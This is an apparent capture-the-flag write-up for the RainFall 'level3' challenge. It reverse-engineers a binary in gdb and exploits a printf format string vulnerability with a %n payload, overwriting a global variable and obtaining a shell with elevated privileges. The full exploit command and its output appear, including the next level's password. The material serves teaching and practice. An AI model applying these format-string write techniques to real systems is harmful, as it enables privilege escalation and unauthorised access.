# Level3

```nasm
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048344  _init
0x08048390  printf
0x08048390  printf@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  fwrite
0x080483b0  fwrite@plt
0x080483c0  system
0x080483c0  system@plt
0x080483d0  __gmon_start__
0x080483d0  __gmon_start__@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  v
0x0804851a  main
0x08048530  __libc_csu_init
0x080485a0  __libc_csu_fini
0x080485a2  __i686.get_pc_thunk.bx
0x080485b0  __do_global_ctors_aux
0x080485dc  _fini
```

There is system() :)

```nasm
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218                            // Allocate a 536 bytes buffer
   0x080484ad <+9>:	mov    eax,ds:0x8049860                     // Move into eax stdin
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax            // Move that on esp+0x8 
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200          // Move size 0x200 = 512
   0x080484be <+26>:	lea    eax,[ebp-0x208]                    // Load into eax whatever is a ebp-0x208 (or esp+0x10)
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax                // And move it back on top of the stack
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>              // Call fgets
   0x080484cc <+40>:	lea    eax,[ebp-0x208]                    // Load into eax whatever is a ebp-0x208 (or esp+0x10)
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax                // And move it back on top of the stack     
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>             // Then call printf
   0x080484da <+54>:	mov    eax,ds:0x804988c                   // Move into eax an empty string ("") (maybe)
   0x080484df <+59>:	cmp    eax,0x40                           // Compare that with 0x40 (64)
   0x080484e2 <+62>:	jne    0x8048518 <v+116>                  // If not equal go to "leave" instruction
   0x080484e4 <+64>:	mov    eax,ds:0x8049880                   // Move into eax stdout
   0x080484e9 <+69>:	mov    edx,eax                            // And move it edx
   0x080484eb <+71>:	mov    eax,0x8048600                      // Move into eax the string "Wait what?!\n"
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx            // Move edx as an argument in stack
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc            // Move that as third argument
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1            // Move 1 as second argument
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax                // Move the string in eax as first argument
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>             // Call fwrite
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d          // Move "/bin/sh" on top of the stack
   0x08048513 <+111>:	call   0x80483c0 <system@plt>             // Then call system
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp                                  // All main does is call the v function
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.
```

Try to execute system() by just jumping to it…

```nasm
(gdb) x/s 0x804860d
0x804860d:	 "/bin/sh"
(gdb) jump *0x080484e4
Continuing at 0x80484e4.
Wait what?!
$ cat /home/user/level4/.pass
cat: /home/user/level4/.pass: Permission denied
```

We indeed get a shell, but we can’t read the file, this is a **security feature of `gdb`** actually, so we should try the normal way !
`fgets` isn’t unsafe like `gets` so the exploit isn’t there

However: 

```nasm
0x080484c7 <+35>:	call   0x80483a0 [fgets@plt](mailto:fgets@plt)              // Call fgets
0x080484cc <+40>:	lea    eax,[ebp-0x208]                  // Load into eax whatever is a ebp-0x208 (or esp+0x10)
0x080484d2 <+46>:	mov    DWORD PTR [esp],eax              // And move it back on top of the stack
0x080484d5 <+49>:	call   0x8048390 printf@plt             // Then call printf
```

This part is interesting :

- We get user input from `fgets` on `stdin`
- And pass that directly to `printf`

This is known as a format string vulnerability :

`printf` is called with whatever we input in `stdin` and doesn’t check for format specifier, meaning we can read and write to any location in memory ! 
We can then trigger the `cmp` check :

```nasm
0x080484da <+54>:	mov    eax,ds:0x804988c                   // Move into eax an empty string ("") (maybe)
0x080484df <+59>:	cmp    eax,0x40                           // Compare that with 0x40 (64)
```

Which will then make the program execute `system` with `/bin/sh` and hopefully this time with the correct rights !

So we want to write 64 into `0x804988` 

When we call `printf` without a format string, it will read arguments from the stack in order, but where would our input be located in the stack ?
The stack should look something like that :

```nasm
[return address]
[saved frame pointer]
[local variables]
[format string pointer] <-- User input
```

In order to check we will craft a payload with a recognizable pattern : 

The %x format specifier will print whatever is on the stack in hexadecimal

```nasm
level3@RainFall:~$ echo -e "\x8c\x98\x04\x08AAAA%x %x %x %x %x %x %x" | ./level3
AAAA200 b7fd1ac0 b7ff37d0 804988c 41414141 25207825 78252078
level3@RainFall:~$
```

We notice in 4th position the address we target and in 5th position our pattern AAAA = 41414141

That means we need to target the 4th position and put in it 64. Our command should look like this :

```bash
echo -e "\x8c\x98\x04\x08%60c%4\$n" | ./level3
```

Where we have first : `\x8c\x98\x04\x08` the address that is 4 bytes long. Then `%60c` 60 more characters to bring the total to 64 as needed. And finally use `%n` (prints out how many characters were written so far) in combination with the `4$` specifier to target the 4th position in the stack : `%4\$n` we need to escape the `$` symbol as we are not trying to read an environment variable.

And of course we maintain the connection with the shell using `cat` :

```bash
level3@RainFall:~$ (echo -e "\x8c\x98\x04\x08%60c%4\$n"; cat) | ./level3

Wait what?!
id
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
